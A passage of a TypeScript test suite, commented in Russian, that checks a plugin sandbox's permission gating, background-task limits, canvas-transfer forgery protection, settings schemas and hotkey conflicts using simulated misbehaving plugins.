    return закрытий === 1 && !шапка.includes('<') && !шапка.includes('{')
      && !шапка.includes('}') && css.includes('#ff4500')
  })
  await check('настоящее имя цвета всё-таки работает', () =>
    Object.keys(parseTheme({ accent: '#FF4500' })).length === 1 && THEME_VAR_NAMES.includes('accent'))
  await blocked('без права ui.theme перекрасить нельзя', () => {
    const без = attacker(['ui'], 'theme-no')
    return без('ui.setTheme', [{ accent: '#ff4500' }])
  })
}

console.log('\n── Фоновые задачи ──')
{
  const bg = await import('./background')
  bg.clearAllTasks()

  await blocked('без права background задачу не завести', () => {
    const без = attacker(['ui'], 'bg-no')
    return без('background.every', [60000, fn, 'задача'])
  })
  await check('слишком частую задачу не заведут', () => {
    try { bg.addTask('жадный', 5, 'каждые 5 мс'); return false } catch { return true }
  })
  await check('задач больше предела не заведут', () => {
    bg.clearAllTasks()
    for (let i = 0; i < bg.MAX_TASKS; i++) bg.addTask('жадный', 60000, 'з' + i)
    try { bg.addTask('жадный', 60000, 'лишняя'); return false } catch { return true }
    finally { bg.clearAllTasks() }
  })
  await check('чужую задачу не остановить', () => {
    bg.clearAllTasks()
    const t = bg.addTask('честный', 60000, 'моя')
    const чужой = bg.removeTask('вредный', t.id)
    const свой = bg.removeTask('честный', t.id)
    bg.clearAllTasks()
    return чужой === false && свой === true
  })
  await check('проспавшая задача не выстреливает залпом', () => {
    // Вкладку спрятали на час: сроков прошло семьсот, но сработать задача
    // обязана один раз, а следующий срок — от СЕЙЧАС, а не от прошлого.
    const сейчас = 1_000_000_000
    const задача = { id: 1, pluginId: 'x', everyMs: 5000, dueAt: сейчас - 3_600_000, runs: 0, label: 'з' }
    const r = bg.dueNow([задача], сейчас)
    return r.run.length === 1 && r.next.get(1) === сейчас + 5000
  })
}

console.log('\n── Холст ──')
{
  const cv = await import('./canvasHub')
  await check('высота холста зажата в границы', () =>
    cv.canvasHeight(100000) === cv.CANVAS_MAX_H && cv.canvasHeight(-5) === cv.CANVAS_MIN_H
    && cv.canvasHeight('чепуха') === 160)
  await blocked('без права panel холст не получить', () => {
    const без = attacker(['ui'], 'cv-no')
    return без('ui.getCanvas', ['viz'])
  })
  await blocked('необъявленный холст не выдаётся', () => {
    // Иначе плагин получил бы холст, которого человек никогда не увидит, —
    // то есть «работает» в отчёте и пусто на экране.
    const d = attacker([...ALL_PERMISSIONS], 'cv-yes')
    return d('ui.getCanvas', ['ниоткуда'])
  })
}

console.log('\n── Пометка «передать, а не копировать» ──')
{
  // Настоящая поломка, найденная пробой при разборе выпуска v1.465.0.
  //
  // Пометка опознавалась по обычному полю __transfer. А поле с таким именем
  // плагин может положить в СВОЁ хранилище и прочитать обратно — и тогда его
  // же значение уезжало списком передачи. Непередаваемый объект в этом списке
  // роняет postMessage, исключение глохнет, и плагин ВИСИТ НАВСЕГДА, ни строчки
  // в журнале. Теперь пометке верят только настоящему холсту.
  const { asTransfer } = await import('./sandbox')

  await check('значение из хранилища плагина не уедет как холст', () =>
    asTransfer({ __transfer: { что: 'обычные данные' } }) === null)
  await check('подделка под холст не уедет как холст', () =>
    asTransfer({ __transfer: { fake: 1, width: 300 } }) === null)
  await check('обычный ответ сети не уедет как холст', () =>
    asTransfer({ ok: true, status: 200, body: 'привет' }) === null)

  await check('настоящий холст всё-таки уедет', () => {
    // В node холста нет, поэтому подставляем класс с тем же именем: проверяется
    // ЛОГИКА (сверка с глобальным классом). Сам холст — со всей дорогой до
    // нарисованного пикселя — проверен пробой в настоящем окне Electron.
    const было = (globalThis as any).OffscreenCanvas
    class Холст {}
    ;(globalThis as any).OffscreenCanvas = Холст
    try {
      const c = new Холст()
      // Проверка «всё запрещено» ничего не значит без обратного случая: если бы
      // передавать перестало вовсе, графика молча умерла бы целиком.
      return asTransfer({ __transfer: c }) === c && asTransfer({ __transfer: {} }) === null
    } finally { (globalThis as any).OffscreenCanvas = было }
  })
}

console.log('\n── Точки монтирования и настройки (v1.467.0) ──')
{
  const reg = await import('./registry')

  await blocked('без права ui кнопку в шапку не поставить', () => {
    const без = attacker(['settings'], 'hdr-no')
    return без('ui.addHeaderButton', [{ tooltip: 'Моё', icon: 'zap', onClick: fn }])
  })
  await blocked('кнопка в шапке без обработчика не ставится', () => {
    const d = attacker([...ALL_PERMISSIONS], 'hdr-yes')
    return d('ui.addHeaderButton', [{ tooltip: 'Моё', icon: 'zap' }])
  })
  await allowed('кнопка в шапке с обработчиком ставится', () => {
    const d = attacker([...ALL_PERMISSIONS], 'hdr-yes')
    return d('ui.addHeaderButton', [{ tooltip: 'Моё', icon: 'zap', onClick: fn }])
  })
  await check('иконка не из списка заменяется, а не рисует пустоту', () => {
    const b = reg.getHeaderButtons().find(x => x.pluginId === 'hdr-yes')
    return !!b && reg.PLUGIN_ICONS.includes(b.icon as never)
  })

  await blocked('без права settings схему не объявить', () => {
    const без = attacker(['ui'], 'sch-no')
    return без('settings.registerSchema', [[{ key: 'a', type: 'toggle', title: 'А', default: true }]])
  })
  await blocked('пустая схема — отказ, а не молчаливая пустая страница', () => {
    const d = attacker([...ALL_PERMISSIONS], 'sch-empty')
    return d('settings.registerSchema', [[]])
  })
  await blocked('схема из одного мусора — отказ', () => {
    const d = attacker([...ALL_PERMISSIONS], 'sch-junk')
    return d('settings.registerSchema', [[{ key: 'x', type: 'html', title: '<img>' }]])
  })

  await check('значения по умолчанию сразу ложатся в хранилище', async () => {
    // Ради этого всё и затевалось: до первого касания человеком настройка
    // должна ИМЕТЬ значение, а не быть undefined.
    const store2 = await import('./store')
    const d = attacker([...ALL_PERMISSIONS], 'sch-def')
    const знач: any = await d('settings.registerSchema', [[
      { key: 'auto_feed', type: 'toggle', title: 'Авто', default: true },
      { key: 'color', type: 'color', title: 'Цвет', default: '#5865f2' },
    ]])
    return store2.readStorage('sch-def', 'auto_feed') === true
      && знач.auto_feed === true && знач.color === '#5865f2'
  })

  await check('сохранённое человеком сильнее значения по умолчанию', async () => {
    // Иначе каждый перезапуск плагина затирал бы выбор человека — и выглядело
    // бы это как «настройка не сохраняется».
    const store2 = await import('./store')
    // Плагин заводим ПЕРВЫМ: attacker пересоздаёт запись плагина с пустым
    // хранилищем, и запись до него была бы стёрта — проверка провалилась бы на
    // собственном порядке действий, а не на коде.
    const d = attacker([...ALL_PERMISSIONS], 'sch-keep')
    store2.writeStorage('sch-keep', 'auto_feed', false)
    const знач: any = await d('settings.registerSchema', [[
      { key: 'auto_feed', type: 'toggle', title: 'Авто', default: true },
    ]])
    return знач.auto_feed === false && store2.readStorage('sch-keep', 'auto_feed') === false
  })

  await check('клавиша из схемы правда регистрируется', async () => {
    // Строка keybind, которая ничего не назначает, — та самая кнопка-обманка.
    const d = attacker([...ALL_PERMISSIONS], 'kb-yes')
    await d('settings.registerSchema', [[
      { key: 'shortcut', type: 'keybind', title: 'Вызов', default: 'Ctrl+Shift+9' },
    ]])
    const h = reg.getHotkeys().find(x => x.pluginId === 'kb-yes' && x.settingsKey === 'shortcut')
    return !!h && h.combo === 'Ctrl+Shift+9'
  })

  await check('кривое сочетание не назначается', () => {
    // Один модификатор отобрал бы у человека привычную клавишу приложения.
    reg.setKeybind('kb-bad', 'shortcut', 'Ctrl+P')
    return !reg.getHotkeys().some(x => x.pluginId === 'kb-bad')
  })

  await check('занятое сочетание не отбирается у соседа', () => {
    reg.setKeybind('kb-first', 'a', 'Ctrl+Alt+7')
    const взял = reg.setKeybind('kb-second', 'b', 'Ctrl+Alt+7')
    const у = reg.getHotkeys().filter(x => x.combo === 'Ctrl+Alt+7')
    return взял === false && у.length === 1 && у[0].pluginId === 'kb-first'
  })

  await check('своё сочетание можно переназначить', () => {
    // Проверка «всё запрещено» ничего не значит без обратного случая.
    reg.setKeybind('kb-first', 'a', 'Ctrl+Alt+8')
    const у = reg.getHotkeys().filter(x => x.pluginId === 'kb-first' && x.settingsKey === 'a')
    return у.length === 1 && у[0].combo === 'Ctrl+Alt+8'
  })

  await check('нажатие разбирается ОДНИМ местом и знает про оба вида клавиш', () => {
    // Два вида клавиш (от плагина и от человека) лежат одним списком нарочно:
    // будь их два, оба плагина заняли бы одно сочетание и один молча умер бы.
    const src = readFileSync('src/App.tsx', 'utf8')
    const i = src.indexOf('getHotkeys()')
    const тело = src.slice(i, i + 900)
    return тело.includes('settingsKey') && тело.includes('invokePlugin')
  })
}

console.log('\n── Уборка за плагином ──')
{
  const cleanup = await import('./cleanup')
  const исходник = readFileSync('src/lib/plugins/cleanup.ts', 'utf8')
  await check('уборка знает про все пять видов оставленного', () =>
    cleanup.SUBSYSTEM_COUNT === 5)
  await check('на каждый вид есть и «за этим», и «за всеми»', () => {
    // Два списка — это два места, где можно забыть строку. Здесь он один, и
    // каждая запись обязана иметь обе половины.
    const пар = [...исходник.matchAll(/\{\s*one:\s*\w+,\s*all:\s*\w+\s*\}/g)].length
    return пар === cleanup.SUBSYSTEM_COUNT
  })
}

console.log(`\nИТОГ: пройдено ${pass}, пробито ${fail}`)
process.exit(fail ? 1 : 0)
